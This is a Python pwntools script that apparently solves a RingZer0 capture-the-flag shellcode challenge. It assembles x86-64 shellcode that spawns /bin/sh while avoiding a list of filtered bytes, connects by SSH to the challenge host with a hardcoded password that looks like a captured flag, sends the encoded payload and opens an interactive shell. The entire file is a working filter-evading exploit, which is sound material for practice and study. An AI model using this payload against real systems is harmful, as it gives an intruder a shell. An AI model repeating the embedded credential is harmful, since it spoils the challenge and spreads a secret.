#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 50:
        return False
    for c in s:
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2f':
            return False
        if c == '\x2e':
            return False
        if c == '\x62':
            return False
        if c == '\x48':
            return False
        if c == '\x98':
            return False
        if c == '\x99':
            return False
        if c == '\x30':
            return False
        if c == '\x31':
            return False
    return True


shellcode =  asm('push 0x%08x' % (unpack('/bin', 32) + 0x08080808))
shellcode += asm('sub dword ptr[rsp], 0x08080808')
shellcode += asm('mov eax, 0x%08x' % (unpack('/sh\x00', 32) + 0x08080808))
shellcode += asm('sub eax, 0x08080808')
shellcode += asm('mov dword ptr[rsp + 4], eax')     # push "/bin/sh\x00"
shellcode += asm('push SYS_execve')
shellcode += asm('pop rax')                         # rax = SYS_execve
shellcode += asm('push 1')
shellcode += asm('pop rsi')
shellcode += asm('dec esi')                         # rsi = 0
shellcode += asm('push rsi')
shellcode += asm('pop rdx')                         # rdx = 0
shellcode += asm('push rsp')
shellcode += asm('pop rdi')                         # rdi = rsp
shellcode += asm('syscall')

if limit(shellcode) == False:
    print('limit failed!')
    exit(0)

conn = ssh(user = 'level3', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-351p97Rd81169t7d4904K6031S', 
           port = 10127)
shell = conn.shell()
shell.sendline(escape_encode(shellcode))
shell.interactive()
